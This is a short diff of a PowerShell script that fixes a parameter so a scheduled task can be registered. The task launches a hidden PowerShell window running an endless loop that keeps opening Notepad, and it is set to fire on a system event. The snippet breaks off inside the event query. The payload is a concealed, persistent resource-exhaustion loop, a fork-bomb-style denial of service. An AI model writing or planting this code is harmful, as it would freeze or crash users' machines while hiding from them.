@@ -1,4 +1,4 @@
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -ArgumentList "-NoProfile -NonInteractive -WindowStyle Hidden -Command `"while (true){Start-Process notepad.exe}`""
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -NonInteractive -WindowStyle Hidden -Command `"while (true){Start-Process notepad.exe}`""
 
 $trigger = New-ScheduledTaskTrigger -OnEvent -Subscription @"
 <QueryList>
